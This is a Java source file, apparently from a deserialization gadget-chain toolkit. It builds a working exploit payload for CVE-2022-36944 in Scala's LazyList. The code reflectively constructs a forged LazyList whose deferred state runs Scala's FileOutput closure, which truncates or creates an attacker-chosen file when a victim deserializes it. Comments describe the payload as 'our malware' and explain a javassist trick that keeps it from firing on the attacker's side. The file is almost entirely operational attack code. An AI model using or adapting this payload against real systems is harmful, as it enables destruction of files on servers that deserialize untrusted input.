package org.ses.gadgetbuilder.chains1;

import javassist.*;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.util.Reflections;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.NoTrampoline;
import scala.Function0;
import scala.sys.process.ProcessBuilder$;

import java.io.File;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.function.Function;


/**
 *  CVE-2022-36944
 *  https://github.com/yarocher/lazylist-cve-poc/tree/main
 */
@Authors(Authors.YAROCHER)
@Dependencies({"org.scala-lang:scala-library:2.13.8"})
@Impact(Impact.ZeroFile)
public class Scala3 extends GadgetChain<NoTrampoline> {


    static {
        try {
            ClassPool classPool = ClassPool.getDefault();
            CtClass ctClass = classPool.get("scala.collection.immutable.LazyList");

            // Actually we don't want our malware code to be executed on our machine when we serialize our
            // forged payload. This is why we set state's bitmap$0 field to true before writing to
            // indicate that state was already evaluated and only right before writing we set this field back to false
            // to make victim's deserializer evaluate state and eventually call our malware Function0.
            // To achieve this result, we define writeObject on LazyList and set bitmap$0 to false there using
            // javassist
            // This extra code definition won't affect on victim's JVM in any way because it exists only in our JVM
            // and it only affects the way object is being serialized (change field value)
            String writeObjectSource =
                    "private void writeObject(java.io.ObjectOutputStream out) {" +
                            "this.bitmap$0 = false;" +
                            "out.defaultWriteObject();" +
                            "}";
            CtMethod newMethod = CtNewMethod.make(writeObjectSource, ctClass);
            ctClass.addMethod(newMethod);
            ctClass.toClass();
        }
        catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public static final Function<Object[], Function0<Object>> FILE_OUTPUT = Scala3::fileOutput;

    public static Function0<Object> fileOutput(Object[] args) {
        String fileToTruncate = (String) args[0];
        boolean append = (Boolean) args[1];
        try {
            Constructor function0Ctor = Class.forName("scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3")
                    .getDeclaredConstructor(ProcessBuilder$.class, File.class, boolean.class);
            function0Ctor.setAccessible(true);

            return (Function0<Object>) function0Ctor.newInstance(new Object[]{null, new File(fileToTruncate), append});
        } catch (Exception e) {}
        return  null;
    }



    public Scala3(NoTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        Function0<Object> function0 = FILE_OUTPUT.apply(new Object[] {command, false});

        Constructor lazyListCtor = Class.forName("scala.collection.immutable.LazyList").getDeclaredConstructor(Function0.class);
        lazyListCtor.setAccessible(true);
        Object lazyList = lazyListCtor.newInstance(function0);

        Field emptyStateField = Class.forName("scala.collection.immutable.LazyList$State$Empty$").getDeclaredField("MODULE$");
        emptyStateField.setAccessible(true);
        Object emptyLazyListState = emptyStateField.get(null);

        Reflections.setFieldValue(lazyList, "scala$collection$immutable$LazyList$$state", emptyLazyListState);

        Reflections.setFieldValue(lazyList, "scala$collection$immutable$LazyList$$stateEvaluated", true);
        Reflections.setFieldValue(lazyList, "bitmap$0", true);

        Constructor proxyCtor = Class.forName("scala.collection.immutable.LazyList$SerializationProxy").getDeclaredConstructor(lazyList.getClass());
        proxyCtor.setAccessible(true);
        Object proxy = proxyCtor.newInstance(lazyList);

        return new TrampolineConnector(proxy);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "scala.collection.immutable.LazyList$SerializationProxy.readObject()\n"+
                "scala.collection.immutable.LazyList.prependAll()\n"+
                "scala.collection.immutable.LazyList.scala$collection$immutable$LazyList$$state()\n"+
                "scala.collection.immutable.LazyList.scala$collection$immutable$LazyList$$state$lzycompute()\n"+
                "scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3.apply()\n"+
                "scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3.apply()\n"+
                "java.io.FileOutputStream.<init>()";
    }
}
